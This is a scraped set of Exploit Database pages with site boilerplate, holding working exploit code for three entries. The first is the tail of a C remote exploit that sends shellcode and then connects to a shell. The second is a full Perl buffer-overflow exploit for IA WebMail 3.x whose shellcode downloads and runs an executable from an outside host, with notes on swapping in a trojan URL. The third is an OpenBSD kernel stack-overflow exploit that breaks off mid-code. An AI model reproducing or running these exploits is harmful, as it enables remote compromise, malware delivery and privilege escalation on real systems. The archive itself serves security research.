PORT_OFFSET_2);for(i=0;i<scsize;i++) { *ptr++=connback[i]; }do_send(host,timeout);Sleep(1000);sockadd.sin_addr.s_addr=htonl(INADDR_ANY);i_len=sizeof(sockadd);if (bind(s1,(struct sockaddr *)&sockadd,i_len)<0) {err_exit("-> bind() error");}if (listen(s1,0)<0) {err_exit("-> listen() error");}printf("-> Waiting for connection...\n");s2=accept(s1,(struct sockaddr *)&sockadd,&i_len);if (s2<0) {err_exit("-> accept() error");}printf("-> Connection from: %s\n\n",inet_ntoa(sockadd.sin_addr));resetalarm();doshell(s2);}else {printf("-> 'Connecting' mode...\n",port);changeport(bindport, port, PORT_OFFSET_1);for(i=0;i<scsize;i++) { *ptr++=bindport[i]; }do_send(host,timeout);Sleep(1000);printf("-> Will try connecting to shell now....\n");i=0;while(!flag) {Sleep(interval*1000);if(connect(s1,(struct sockaddr *)&sockadd, sizeof(sockadd))<0) {printf("-> Trial #%d....\n",i++);}else { flag=1; }}printf("-> Connected to shell at %s:%d\n\n",inet_ntoa(sockadd.sin_addr),port);resetalarm();doshell(s1);}return 0;}// milw0rm.com [2003-11-14]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 124
IA WebMail Server 3.x - 'iaregdll.dll 1.0.0.5' Remote Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDIA WebMail Server 3.x - 'iaregdll.dll 1.0.0.5' Remote OverflowEDB-ID:124CVE:2003-1192EDB Verified:Author:Peter Winter-SmithType:remoteExploit:/Platform:WindowsDate:2003-11-19Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl -w## IA WebMail 3.x (iaregdll.dll version 1.0.0.5) Remote Exploit# Application Specific Shellcode: URL Downloader#  - www elitehaven net/ncat.exe (downloaded)#  - c:\nc.exe                          (created)## By Peter Winter-Smith peter4020 hotmail com# Shellcode included - will need reassembling to use different# urls and files etc.## Tested against:#  - Windows XP Home SP1#  - Windows 2000 Pro SP4## Shellcode should work each time, since it steals it's addresses# from the iaregdll.dll module import tables.# Uses a very static jmp esp in iaregdll.dll - Should work on all# servers without alteration!## If the remote server is running a firewall, the urldownloader# will be unable to spawn a shell, so for testing I recommend# that you close the firewalls, or get another shellcode which# will deal with this. This exploit is for PoC purposes only :o)## Notes:#  - WebMailsvr.exe exits without consuming 100% resources in most#    cases.#  - This has only been tested with IA WebMail 3.1, however it was#    designed to exploit all versions.use IO::Socket;if(!($ARGV[1])){print "Usage: iawebmail.pl <victim> <port>\n\n";exit;}$shellcode =            "\x90\xEB\x3C\x5F\x55\x89\xE5\x81" ."\xC4\xE8\xFF\xFF\xFF\x57\x31\xDB" ."\xB3\x07\xB0\xFF\xFC\xF2\xAE\xFE" ."\x47\xFF\xFE\xCB\x80\xFB\x01\x75" ."\xF4\x5F\x57\x8D\x7F\x0B\x57\x8D" ."\x7F\x13\x57\x8D\x7F\x08\x57\x8D" ."\x7F\x23\x57\x8D\x7F\x09\x47\x57" ."\x8D\x54\x24\x14\x52\xEB\x02\xEB" ."\x52\x89\xD6\xFF\x36\xFF\x15\xDC" ."\x51\x02\x10\x5A\x52\x8D\x72\xFC" ."\xFF\x36\x50\xFF\x15\x14\x52\x02" ."\x10\x5A\x52\x31\xC9\x51\x51\x8D" ."\x72\xF0\xFF\x36\x8D\x72\xF4\xFF" ."\x36\x51\xFF\xD0\x5A\x52\xFF\x72" ."\xEC\xFF\x15\xDC\x51\x02\x10\x5A" ."\x52\x8D\x72\xF8\xFF\x36\x50\xFF" ."\x15\x14\x52\x02\x10\x5A\x52\x31" ."\xC9\x41\x51\x8D\x72\xF0\xFF\x36" ."\xFF\xD0\xCC\xE8\x6B\xFF\xFF\xFF" ."\x55\x52\x4C\x4D\x4F\x4E\x2E\x44" ."\x4C\x4C\xFF\x55\x52\x4C\x44\x6F" ."\x77\x6E\x6C\x6F\x61\x64\x54\x6F" ."\x46\x69\x6C\x65\x41\xFF\x57\x69" ."\x6E\x45\x78\x65\x63\xFF\x68\x74" ."\x74\x70\x3A\x2F\x2F\x77\x77\x77" ."\x2E\x65\x6C\x69\x74\x65\x68\x61" ."\x76\x65\x6E\x2E\x6E\x65\x74\x2F" ."\x6E\x63\x61\x74\x2E\x65\x78\x65" ."\xFF\x63\x3A\x5C\x6E\x63\x2E\x65" ."\x78\x65\xFF\x6B\x65\x72\x6E\x65" ."\x6C\x33\x32\x2E\x64\x6C\x6C\xFF";$victim = IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>$ARGV[0],PeerPort=>$ARGV[1])or die "Unable to connect to $ARGV[0] on port $ARGV[1]";$ebp = "BBBB";$eip = "\x33\xBD\x02\x10";$exploit = "GET /" . "a"x1036 . $ebp . $eip . $shellcode . " HTTP/1.1\n\n";print $victim $exploit;print " + Malicious GET request sent ...\n";print " + Wait a moment now, then connect to $ARGV[0] on port 9999.\n";sleep(5);print "Done.\n";close($victim);exit;##########################################                            SHELLCODE                              ########################################## ; IA WebMail 3.x Shellcode (iaregdll.dll version 1.0.0.5)# ; Url Download + Execute# ; By Peter Winter-Smith# ; [peter4020@hotmail.com]# ;# ; nasmw -fbin -o iashellcode.s iashellcode.asm## bits 32## int3# jmp short killnull## next:# pop edi## push ebp# mov ebp, esp# add esp, -24## push edi## xor ebx, ebx# mov bl, 07h# mov al, 0ffh## cld# nullify:# repne scasb# inc byte [edi-01h]# dec bl# cmp bl, 01h# jne nullify## pop edi## push edi		; 'URLMON.DLL'# lea edi, [edi+11]# push edi		; 'URLDownloadToFileA'# lea edi, [edi+19]# push edi		; 'WinExec'# lea edi, [edi+08]# push edi		; 'http://www.elitehaven.net/ncat.exe'# lea edi, [edi+35]# push edi		; 'c:\nc.exe'# lea edi, [edi+09]# inc edi# push edi		; 'kernel32.dll'## lea edx, [esp+20]# push edx## jmp short over# killnull:# jmp short data# over:## mov esi, edx# push dword [esi]## call [100251DCh]	; LoadLibraryA## pop edx# push edx# lea esi, [edx-04]# push dword [esi]## push eax## call [10025214h]	; GetProcAddress(URLMON.DLL, URLDownloadToFileA);## pop edx# push edx## xor ecx, ecx# push ecx# push ecx# lea esi, [edx-16]	; file path# push dword [esi]# lea esi, [edx-12]	; url# push dword [esi]# push ecx## call eax## pop edx# push edx## push dword [edx-20]## call [100251DCh]	; LoadLibraryA## pop edx# push edx### lea esi, [edx-08]# push dword [esi]	; 'WinExec'# push eax		; kernel32.dll handle## call [10025214h]	; GetProcAddress(kernel32.dll, WinExec);## pop edx# push edx## xor ecx, ecx# inc ecx# push ecx## lea esi, [edx-16]	; file path# push dword [esi]## call eax## int3### data:# call next# db 'URLMON.DLL',0ffh# db 'URLDownloadToFileA',0ffh# db 'WinExec',0ffh# db 'http://www.elitehaven.net/ncat.exe',0ffh# ; When altering, you MUST be sure# ; to also alter the offsets in the 0ffh to null# ; byte search!# ; for example:# ;   db 'http://www.site.com/someguy/trojan.exe',0ffh# ; count the length of the url, and add one for the 0ffh byte.# ; The above url is 38 bytes long, plus one for our null, is 39 bytes.# ; find the code saying (at the start of the shellcode):# ;   push edi		; 'http://www.elitehaven.net/ncat.exe'# ;   lea edi, [edi+35]# ; and make it:# ;   push edi		; 'http://www.site.com/someguy/trojan.exe'# ;   lea edi, [edi+39]# ; same goes for the filename below :o)# db 'c:\nc.exe',0ffh# db 'kernel32.dll',0ffh###################################################################### milw0rm.com [2003-11-19]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 125
OpenBSD 2.x < 3.3 - 'exec_ibcs2_coff_prep_zmagic()' kernel stack overflow - BSD local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDOpenBSD 2.x < 3.3 - 'exec_ibcs2_coff_prep_zmagic()' kernel stack overflowEDB-ID:125CVE:2003-0955EDB Verified:Author:Sinan ErenType:localExploit:/Platform:BSDDate:2003-11-19Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** OpenBSD 2.x - 3.3                                                              **//** exec_ibcs2_coff_prep_zmagic() kernel stack overflow	              **//** note: ibcs2 binary compatibility with SCO and ISC is enabled    **//** in the default install                                                            **//** 	Copyright Feb 26 2003 Sinan "noir" Eren 	              **//**	noir olympos org | noir uberhax0r net	            **//**	greets to brother nahual for making this usefull!          **/#include <stdio.h>#include <sys/types.h>#include <fcntl.h>#include <unistd.h>#include <sys/param.h>#include <sys/sysctl.h>#include <sys/signal.h>//#include "ibcs2_exec.h"/* kernel_sc.s shellcode *//* much improved the opcode search, fixed the stupid logic bug! */unsigned char shellcode[] ="\xe8\x0f\x00\x00\x00\x78\x56\x34\x12\xfe\xca\xad\xde\xad\xde\xef\xbe""\x90\x90\x90\x5f\x8b\x0f\x8b\x59\x10\x31\xc0\x89\x43\x04\x8b\x13\x89""\x42\x04\x8b\x51\x14\x89\x42\x0c\x8d\x6c\x24\x68\x0f\x01\x4f\x04\x8b""\x5f\x06\x8b\x93\x00\x04\x00\x00\x8b\x8b\x04\x04\x00\x00\xc1\xe9\x10""\xc1\xe1\x10\xc1\xe2\x10\xc1\xea\x10\x09\xca\x31\xc9\x41\x8a\x1c\x0a""\x80\xfb\xe8\x75\xf7\x8d\x1c\x0a\x41\x8b\x0c\x0a\x83\xc1\x05\x01\xd9""\x89\xcf\xb0\xff\xfc\xb9\xff\xff\xff\xff\xf2\xae\x8a\x1f\x80\xfb\xd0""\x75\xef\x47\x31\xc0\x57\xc3";/* do not use! *//*silvio gotta get his brain together and understand why sometimesyou need to return to kernel code rather than setting the selectorspushing ss,esp,eflag,cs,eip and do an iret!well, aloha?? vnode locks being held ? mutex locks being held ?you have to return to the kernel code that unlocks the syncronizationobjects*/unsigned char iret_shellcode[] ="\xe8\x0f\x00\x00\x00\x78\x56\x34\x12\xfe\xca\xad\xde\xad\xde\xef\xbe""\x90\x90\x90\x5f\x8b\x0f\x8b\x59\x10\x31\xc0\x89\x43\x04\x8b\x13\x89""\x42\x04\x8b\x51\x14\x89\x42\x0c\xfa\x6a\x1f\x07\x6a\x1f\x1f\x6a\x00""\x5f\x6a\x00\x5e\x68\x00\xd0\xbf\xdf\x5d\x6a\x00\x5b\x6a\x00\x5a\x6a""\x00\x59\x6a\x00\x58\x6a\x1f\x68\x00\xd0\xbf\xdf\x68\x87\x02\x00\x00""\x6a\x17";unsigned char pusheip[] ="\x68\x00\x00\x00\x00"; /* fill eip */unsigned char iret[] ="\xcf";unsigned char exitsh[] ="\x31\xc0\xcd\x80\xcc"; /* xorl %eax,%eax, int $0x80, int3 */#define ZERO(p) memset(&p, 0x00, sizeof(p))/** COFF file header*/struct coff_filehdr {u_short     f_magic;        /* magic number */u_short     f_nscns;        /* # of sections */long        f_timdat;       /* timestamp */long        f_symptr;       /* file offset of symbol table */long        f_nsyms;        /* # of symbol table entries */u_short     f_opthdr;       /* size of optional header */u_short     f_flags;        /* flags */};/* f_magic flags */#define COFF_MAGIC_I386 0x14c/* f_flags */#define COFF_F_RELFLG   0x1#define COFF_F_EXEC     0x2#define COFF_F_LNNO     0x4#define COFF_F_LSYMS    0x8#define COFF_F_SWABD    0x40#define COFF_F_AR16WR   0x80#define COFF_F_AR32WR   0x100/** COFF system header*/struct coff_aouthdr {short       a_magic;short       a_vstamp;long        a_tsize;long        a_dsize;long        a_bsize;long        a_entry;long        a_tstart;long        a_dstart;};/* magic */#define COFF_ZMAGIC     0413/** COFF section header*/struct coff_scnhdr {char        s_name[8];long        s_paddr;long        s_vaddr;long        s_size;long        s_scnptr;long        s_relptr;long        s_lnnoptr;u_short     s_nreloc;u_short     s_nlnno;long        s_flags;};/* s_flags */#define COFF_STYP_TEXT          0x20#define COFF_STYP_DATA          0x40#define COFF_STYP_SHLIB         0x800void get_proc(pid_t, struct kinfo_proc *);void sig_handler();intmain(int argc, char **argv){u_int i, fd, debug = 0;u_char *ptr, *shptr;u_long *lptr;u_long pprocadr, offset;struct kinfo_proc kp;char *args[] = { "./ibcs2own", NULL};char *envs[] = { "RIP=theo", NULL};//COFF structuresstruct coff_filehdr fhdr;struct coff_aouthdr ahdr;struct coff_scnhdr  scn0, scn1, scn2;if(argv[1]) {if(!strncmp(argv[1], "-v", 2))debug = 1;else {printf("-v: verbose flag only\n");exit(0);}}ZERO(fhdr);fhdr.f_magic = COFF_MAGIC_I386;fhdr.f_nscns = 3; //TEXT, DATA, SHLIBfhdr.f_timdat = 0xdeadbeef;fhdr.f_symptr = 0x4000;fhdr.f_nsyms = 1;fhdr.f_opthdr = sizeof(ahdr); //AOUT opt header sizefhdr.f_flags = COFF_F_EXEC;ZERO(ahdr);ahdr.a_magic = COFF_ZMAGIC;ahdr.a_tsize = 0;ahdr.a_dsize = 0;ahdr.a_bsize = 0;ahdr.a_entry = 0x10000;ahdr.a_tstart = 